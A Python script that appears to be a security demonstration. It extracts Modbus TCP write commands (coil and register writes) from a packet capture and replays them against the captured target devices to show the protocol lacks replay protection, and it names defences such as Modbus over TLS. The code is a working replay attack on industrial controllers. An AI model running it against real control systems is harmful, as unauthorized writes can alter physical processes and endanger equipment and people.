#!/usr/bin/env python3
"""test-modbus-replay.py — extract Modbus FC5/FC6/FC15/FC16 frames from a
captured pcap and replay them at the original target. Demonstrates the
absence of replay protection in plain Modbus TCP.

Usage:
  ./test-modbus-replay.py path/to/capture.pcap

Reads with `tshark -V -r <pcap>` to keep dependencies minimal — no scapy.
"""
import argparse, subprocess, sys, time, struct
from pymodbus.client import ModbusTcpClient

WRITE_FCS = {5, 6, 15, 16}

def parse_pcap(path):
    """Return list of (dst_ip, dst_port, fc, addr, value_or_count, raw_pdu)."""
    cmd = ["tshark", "-r", path, "-Y", "modbus", "-T", "fields",
           "-e", "ip.dst", "-e", "tcp.dstport",
           "-e", "modbus.func_code", "-e", "modbus.regnum16",
           "-e", "modbus.bitnum",   "-e", "modbus.regval_uint16",
           "-e", "modbus.bitval", "-E", "separator=|"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    except FileNotFoundError:
        sys.exit("tshark not found. Install with: sudo apt install -y tshark")
    if r.returncode != 0:
        sys.exit(f"tshark error: {r.stderr[:300]}")
    out = []
    for line in r.stdout.splitlines():
        f = line.split("|")
        if len(f) < 7: continue
        try:
            fc = int(f[2])
        except (ValueError, IndexError):
            continue
        if fc not in WRITE_FCS:
            continue
        regnum = int(f[3]) if f[3] else None
        bitnum = int(f[4]) if f[4] else None
        regval = int(f[5]) if f[5] else None
        bitval = int(f[6]) if f[6] else None
        out.append({"dst": f[0], "port": int(f[1]) if f[1] else 502,
                    "fc": fc, "regnum": regnum, "bitnum": bitnum,
                    "regval": regval, "bitval": bitval})
    return out

def replay_one(frame):
    target = frame["dst"]; port = frame["port"]
    print(f"  replaying FC{frame['fc']} → {target}:{port} addr={frame.get('regnum') or frame.get('bitnum')} val={frame.get('regval') or frame.get('bitval')}")
    c = ModbusTcpClient(target, port=port, timeout=2)
    if not c.connect():
        print(f"    CONNECT FAILED"); return False
    try:
        if frame["fc"] == 5:
            r = c.write_coil(address=frame["bitnum"] or 0, value=bool(frame["bitval"]), device_id=0 if port == 502 else 1)
        elif frame["fc"] == 6:
            r = c.write_register(address=frame["regnum"] or 0, value=frame["regval"] or 0, device_id=0 if port == 502 else 1)
        else:
            print(f"    FC{frame['fc']} replay not implemented in this script"); return False
        print(f"    {'ACCEPTED' if not r.isError() else f'REJECTED ({r})'}")
        return not r.isError()
    finally:
        c.close()

def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("pcap", help="Path to captured pcap (FC5/6 frames present)")
    ap.add_argument("--delay", type=float, default=0.5, help="seconds between replays")
    ap.add_argument("--max",   type=int,   default=10,  help="cap on replays")
    args = ap.parse_args()
    frames = parse_pcap(args.pcap)
    if not frames:
        print("no FC5/FC6 frames found in pcap — try a capture taken during a write attack"); sys.exit(1)
    print(f"found {len(frames)} write frames in {args.pcap}; replaying up to {args.max}…")
    n = 0
    for f in frames[:args.max]:
        replay_one(f)
        n += 1
        time.sleep(args.delay)
    print(f"\nreplayed {n} frames. Real Modbus has no nonce / no timestamp / no auth — slave accepted every one.")
    print("This is precisely why DNP3 Secure Auth (SA v5/v6), Modbus over TLS, and OT IDS exist.")

if __name__ == "__main__":
    main()
